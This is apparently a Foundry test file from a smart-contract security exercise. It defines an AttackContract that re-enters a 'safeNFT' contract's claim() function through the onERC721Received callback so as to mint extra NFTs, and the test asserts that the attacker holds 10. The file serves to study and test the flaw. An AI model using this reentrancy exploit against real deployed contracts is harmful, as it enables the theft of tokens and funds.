// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/SafeNFT.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract safeNFTTest is Test {
    safeNFT nftContract;
    AttackContract attack;

    address owner = makeAddr("OWNER");
    address hacker = makeAddr("HACKER");

    function setUp() external {
        vm.prank(owner);
        nftContract = new safeNFT("ThisNFT", "NFT", 0.01 ether);
        attack = new AttackContract(address(nftContract));
    }

    function test_ReEntrancy() external {
        vm.deal(payable(address(attack)), 0.01 ether);
        vm.startPrank(payable(address(attack)));
        // for(uint256 i; i < 10; ++i) {
            attack.buy();
        // }
        vm.stopPrank();

        assertEq(nftContract.balanceOf(address(attack)), 10);
    }
}

contract AttackContract is IERC721Receiver {
    safeNFT safeNFTContract;

    constructor(address _addr) {
        safeNFTContract = safeNFT(_addr);
    }

    function buy() external {
        safeNFTContract.buyNFT{ value: 0.01 ether }();
        safeNFTContract.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public override returns(bytes4) {
        // for(uint256 i; i < 2; ++i) {
            safeNFTContract.claim();
        // }
        return IERC721Receiver.onERC721Received.selector;
    }
}